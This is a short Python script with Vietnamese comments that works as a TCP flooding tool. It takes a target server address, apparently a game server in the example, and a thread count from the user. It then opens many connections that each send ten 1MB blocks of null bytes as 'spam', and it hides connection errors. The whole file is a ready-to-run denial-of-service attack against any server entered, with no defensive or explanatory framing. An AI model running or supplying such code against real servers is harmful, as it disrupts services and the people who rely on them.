import socket
import threading
import time

# Hàm gửi gói tin
def send_packet(server_ip, server_port, packet, packet_count, thread_id):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((server_ip, server_port))
            for i in range(packet_count):
                s.sendall(packet)
            print(f"Luồng {thread_id} đã gửi {packet_count} gói tin.")
    except Exception as e:
        pass  # Không hiển thị lỗi trong terminal

# Hàm hủy luồng sau 5 giây
def stop_thread_after_timeout(thread, timeout=5):
    time.sleep(timeout)
    if thread.is_alive():
        print(f"Luồng {thread.name} đã hết thời gian 5 giây, dừng lại!")
        # Tạm dừng việc gửi gói tin sau 5 giây

# Nhập IP và port từ người dùng
server_address = input("Nhập địa chỉ server (ví dụ: dragonsmp.myftp.org:15571)__cre:buibadat1987: ")
server_ip, server_port = server_address.split(":")
server_port = int(server_port)  # Chuyển cổng sang số nguyên

# Tạo gói tin spam 1MB
packet = b"\x00" * (1024 * 1024)  # Một gói tin 1MB

# Mỗi luồng gửi 10 gói tin
packet_count = 10

# Số luồng muốn sử dụng
thread_count = int(input("Nhập số lượng luồng: "))

# Tạo và khởi tạo các luồng
threads = []
for i in range(thread_count):
    thread = threading.Thread(target=send_packet, args=(server_ip, server_port, packet, packet_count, i+1))
    threads.append(thread)
    thread.start()

    # Cài đặt thời gian giới hạn 5 giây cho mỗi luồng
    timer = threading.Thread(target=stop_thread_after_timeout, args=(thread,))
    timer.start()

# Đợi tất cả các luồng hoàn thành
for thread in threads:
    thread.join()

print("Hoàn tất gửi gói tin.")